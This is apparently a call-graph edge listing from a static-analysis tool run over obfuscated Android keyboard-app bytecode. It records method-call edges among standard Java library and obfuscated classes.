VIRTUAL edge: $r12 = virtualinvoke r0.<lsn: lts l()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsn: lts l()>
STATIC edge: $r7 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("\\p{Punct}*") in <iwt: void <clinit>()> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <lsb: java.lang.Object next()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<java.lang.Object: java.lang.Class getClass()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(8) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<java.lang.StringBuilder: void <init>()>() in <iye: void O(int,int)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r3, $r6) in <lsd: boolean b(lsr)> ==> <lsn: void q(lsz,java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <lkq: int hashCode()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<lly: void <init>()>() in <lma: lly g()> ==> <lly: void <init>()>
SPECIAL edge: specialinvoke $r10.<java.lang.StringBuilder: void <init>(int)>($i1) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r2.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("negative size: ") in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: int hashCode()>
INTERFACE edge: $r5 = interfaceinvoke $r10.<java.util.Iterator: java.lang.Object next()>() in <hbv: void j()> ==> <llg: java.lang.Object next()>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, 0, 1) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [") in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lmp: void <init>()>() in <lmo: void <init>(java.util.Comparator)> ==> <lmp: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r14.<lkl: lkq g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lkl: lkq g()>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(6) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <j$.util.concurrent.k: boolean equals(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r4 = interfaceinvoke $r0.<java.util.List: java.util.Iterator iterator()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lkq: java.util.Iterator iterator()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.util.LinkedHashSet: void <init>(java.util.Collection)>($r2) in <ose: void <clinit>()> ==> <java.util.LinkedHashSet: void <init>(java.util.Collection)>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: java.lang.Object next()> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lid: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.Object: int hashCode()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.List: java.lang.Object get(int)>($i1) in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>($r2, $i0, $i0, $r1) in <j$.util.concurrent.e: java.util.Iterator iterator()> ==> <j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>
STATIC edge: $r1 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r2) in <lma: lma p(java.util.Collection)> ==> <lma: lma i(int,java.lang.Object[])>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lqp: java.lang.Object get(int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.String: void <init>(char[])>($r1) in <iwt: java.lang.String d(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r18.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_SEARCH", 18, 18) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkx: lma q()>() in <llo: lma u()> ==> <lkx: lma q()>
SPECIAL edge: specialinvoke $r4.<liw: void <init>(ljd)>(r0) in <ljd: java.util.Iterator l()> ==> <liw: void <init>(ljd)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lid: void <init>()>() in <lki: void <init>(java.lang.Object,java.lang.Object)> ==> <lid: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i2 = staticinvoke <java.lang.Math: int max(int,int)>($i2, $i0) in <kwe: int U(int,int,int)> ==> <java.lang.Math: int max(int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkx: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("null key in entry: null=") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r9 = virtualinvoke $r7.<mly: java.lang.IllegalArgumentException f()>() in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <mly: java.lang.IllegalArgumentException f()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" and ") in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.Object: int hashCode()>
STATIC edge: $i1 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r1) in <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i4) in <ljd: int z(int,int,int,int)> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <iye: void y(boolean,java.lang.Object)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <iye: java.lang.String r(java.lang.String,java.lang.Object[])>("%s (%s) must not be negative", $r1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <iye: java.lang.String r(java.lang.String,java.lang.Object[])>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r3) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s h(j$.util.concurrent.s,j$.util.concurrent.s)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.lang.Object[] y()>() in <ljd: java.lang.Object k(int)> ==> <ljd: java.lang.Object[] y()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkh: int c()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int c()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.util.Set g()>
VIRTUAL edge: $i0 = virtualinvoke $r7.<lsm: int a(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: int a(lsz)>
STATIC edge: $r1 = staticinvoke <izw: java.lang.Object al(int)>($i1) in <ljd: int b()> ==> <izw: java.lang.Object al(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <izw: java.lang.Object al(int)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljd: void t(int)>($i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: void t(int)>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <ljf: boolean add(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lmo: int a(java.lang.Object,java.lang.Object)>($r3, $r8) in <lqs: boolean equals(java.lang.Object)> ==> <lmo: int a(java.lang.Object,java.lang.Object)>
STATIC edge: $i3 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i2) in <ljd: int f(java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: $i9 = staticinvoke <izw: int af(int,int)>($i2, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int af(int,int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <ljd: java.lang.Object j()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Boolean: java.lang.Boolean valueOf(boolean)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r2.<java.util.NoSuchElementException: void <init>()>() in <lsb: java.lang.Object next()> ==> <java.util.NoSuchElementException: void <init>()>
VIRTUAL edge: $i8 = virtualinvoke $r13.<lvq: int size()>() in <lvr: void <init>(lvr,lvr)> ==> <lvq: int size()>
SPECIAL edge: specialinvoke $r15.<lme: void <init>(lkx,int)>($r12, $i0) in <lmb: lme f()> ==> <lme: void <init>(lkx,int)>
VIRTUAL edge: virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>()> ==> <java.lang.Exception: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set f()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.util.Set f()>
SPECIAL edge: specialinvoke $r5.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_SEARCH_METADATA", 5, 5) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
INTERFACE edge: $i0 = interfaceinvoke $r0.<java.util.List: int size()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: int size()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $z2 = staticinvoke <lvm: boolean i(char)>($c1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <lvm: boolean i(char)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i7, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lql: void <init>(java.lang.Object[],int)> ==> <lkq: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>($r2, $i1, $i3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(9) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r0 = staticinvoke <j$.sun.misc.b: j$.sun.misc.b h()>() in <j$.util.concurrent.r: void <clinit>()> ==> <j$.sun.misc.b: j$.sun.misc.b h()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $i6 = staticinvoke <izw: int af(int,int)>($i3, $i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int af(int,int)>
SPECIAL edge: specialinvoke $r9.<mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>($r2, $r3, $r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <mly: void <init>(java.lang.Object,java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.WeakHashMap: void <init>()>() in <gwk: void <init>()> ==> <java.util.WeakHashMap: void <init>()>
SPECIAL edge: specialinvoke $r2.<lmc: void <init>(lme)>(r0) in <lme: lma c()> ==> <lmc: void <init>(lme)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map n(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.util.Map n(int)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int c()>() in <liz: void <init>(ljd)> ==> <ljd: int c()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int highestOneBit(int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lrg: int hashCode()>
SPECIAL edge: specialinvoke $r6.<lrg: void <init>(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <lrg: void <init>(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lje: void <init>(ljf)>(r0) in <ljf: java.util.Iterator iterator()> ==> <lje: void <init>(ljf)>
SPECIAL edge: specialinvoke $r28.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <java.lang.Character$UnicodeBlock: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Character$UnicodeBlock: void <clinit>()>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: java.lang.Object e(int)> ==> <ljf: java.lang.Object[] s()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractSet: void <init>()>() in <lvq: void <init>(lvr,int)> ==> <java.util.AbstractSet: void <init>()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r5) in <izw: java.lang.Object al(int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(char[])> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lma: lkq f()>() in <lma: lkq k()> ==> <lqr: lkq f()>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int n(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.util.concurrent.ConcurrentHashMap: int n(int)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <liy: int size()>
STATIC edge: $r1 = staticinvoke <lkq: lkq h(java.lang.Object[],int)>($r2, $i0) in <lqr: lkq f()> ==> <lkq: lkq h(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractCollection: void <init>()>() in <lkh: void <init>()> ==> <java.util.AbstractCollection: void <init>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(3) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <lma: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean deepEquals(java.lang.Object[],java.lang.Object[])>($r2, $r3) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean deepEquals(java.lang.Object[],java.lang.Object[])>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.String toString()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: java.lang.Object next()>
STATIC edge: $r1 = staticinvoke <j$.sun.misc.b: java.lang.reflect.Field i()>() in <j$.sun.misc.b: void <clinit>()> ==> <j$.sun.misc.b: java.lang.reflect.Field i()>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int highestOneBit(int)>($i1) in <lkg: int a(int,int)> ==> <java.lang.Integer: int highestOneBit(int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int,java.lang.Class)>($r2, $i0, $i1, $r3) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int,java.lang.Class)>
STATIC edge: $r1 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <lvr: int hashCode()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lql: int j()>
STATIC edge: $r4 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r4) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lkq: boolean isEmpty()>() in <lkq: lsb C(int)> ==> <java.util.AbstractCollection: boolean isEmpty()>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r0) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lqr: int j()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "fromLocale", 222, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r3.<java.lang.Object: int hashCode()>() in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<com.google.android.apps.inputmethod.latin.LatinApp: void <init>()>() in <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <init>()> ==> <com.google.android.apps.inputmethod.latin.LatinApp: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkq: java.lang.Object get(int)>($i2) in <lkq: int hashCode()> ==> <lql: java.lang.Object get(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: $r5 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object p()>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r8, $i2, $r4) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lkh: java.lang.Object[] n()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: java.lang.Object[] n()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<lig: void <init>()>() in <lim: void <init>()> ==> <lig: void <init>()>
VIRTUAL edge: $i2 = virtualinvoke $r0.<androidx.core.content.FileProvider: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>(null, null, "", $r8) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: int update(android.net.Uri,android.content.ContentValues,java.lang.String,java.lang.String[])>
STATIC edge: $r1 = staticinvoke <java.lang.System: java.lang.String getProperty(java.lang.String)>("line.separator") in <lwe: void <clinit>()> ==> <java.lang.System: java.lang.String getProperty(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lrg: lsa l()>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Collection: boolean isEmpty()>() in <lmb: lme f()> ==> <java.util.AbstractCollection: boolean isEmpty()>
VIRTUAL edge: $i1 = virtualinvoke $r11.<lma: int size()>() in <lmb: lme f()> ==> <lqr: int size()>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lqp: java.lang.Object get(int)> ==> <iye: void O(int,int)>
